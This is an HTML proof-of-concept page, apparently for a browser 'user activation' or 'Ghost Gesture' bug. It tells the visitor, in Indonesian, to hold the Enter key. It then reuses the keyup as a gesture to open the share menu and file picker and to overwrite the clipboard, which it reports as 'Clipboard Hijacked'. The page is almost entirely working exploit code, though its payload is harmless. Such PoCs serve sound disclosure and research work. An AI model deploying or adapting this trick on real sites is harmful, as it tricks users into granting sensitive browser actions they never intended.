<!DOCTYPE html>
<html>

<head>
    <title>PoC - Site B (Sensitive APIs)</title>
    <style>
        body {
            font-family: monospace;
            background: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        #timer {
            font-size: 3rem;
            font-weight: bold;
        }

        #status {
            margin-top: 20px;
            color: #666;
            text-align: center;
            max-width: 80%;
        }
    </style>
</head>

<body>

    <div id="timer">2s...</div>
    <div id="status">Tahan terus sampai 1s</div>

    <script>
        setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
        setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);

        window.addEventListener('keyup', async (e) => {
            if (e.key === 'Enter') {
                const status = document.getElementById('status');

                if (navigator.userActivation.isActive) {
                    let results = [];

                    try {
                        if (navigator.share) {
                            await navigator.share({ title: 'Ghost Gesture', text: 'PoC Leak', url: window.location.href });
                            results.push("✅ Share Menu Opened");
                        }
                    } catch (err) { console.log("Share failed", err); }

                    try {
                        if (window.showOpenFilePicker) {
                            await window.showOpenFilePicker();
                            results.push("✅ File Picker Opened");
                        }
                    } catch (err) { console.log("File Picker failed", err); }

                    try {
                        await navigator.clipboard.writeText("GHOST_GESTURE_LEAK");
                        results.push("✅ Clipboard Hijacked");
                    } catch (err) { }

                    status.innerHTML = results.length > 0
                        ? `<span style="color:black; font-weight:bold;">${results.join("<br>")}</span>`
                        : "RESULT: FAILED (Blocked by Browser Policy)";

                } else {
                    status.innerText = "RESULT: EXPIRED (User Activation was not preserved)";
                }
            }
        });
    </script>
</body>

</html>
